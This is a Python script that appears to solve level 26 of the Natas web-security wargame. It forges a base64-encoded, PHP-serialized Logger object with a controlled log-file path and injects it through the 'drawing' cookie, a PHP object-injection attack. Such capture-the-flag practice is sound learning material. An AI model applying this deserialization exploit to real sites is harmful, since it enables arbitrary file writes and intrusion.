import base64

import phpserialize

from natas import Natas


PHPSESSID = 'asdf'


class Logger:

    def __init__(self, filename):
        self.init_msg = 'session started'
        self.exit_msg = 'session end'
        self.log_file = f'img/natas26_{PHPSESSID}.png'

    @staticmethod
    def serializer(obj):
        serializable = phpserialize.phpobject(
                'Logger',
                {
                    'LoggerinitMsg': obj.init_msg,
                    'LoggerexitMsg': obj.exit_msg,
                    'LoggerlogFile': obj.log_file,
                    'Loggerx1': 3,
                    'Loggerx2': 4,
                    'Loggery1': 5,
                    'Loggery2': 6,
                }
                )

        return serializable


logger = Logger('asdf')

serialized = phpserialize.dumps([[logger]], object_hook=Logger.serializer)

readable = serialized

serialized = base64.encodebytes(serialized).decode('ascii')
serialized = serialized.replace('\n', '')

prep_natas = Natas('natas26', keep_session=True)
real_natas = Natas('natas26', keep_session=True)

real_resp = real_natas.get_response(get_data={
    'x1': 5,
    'x2': 6,
    'y1': 3,
    'y2': 4
    })

drawing = real_natas.get_cookies()['drawing']
drawing = drawing.replace('%3D', '=')
drawing = base64.decodebytes(drawing.encode()).decode()
print(drawing)


prep_natas.set_cookie('phpsessid', PHPSESSID)
prep_natas.set_cookie('drawing', serialized)

resp = prep_natas.get_response()
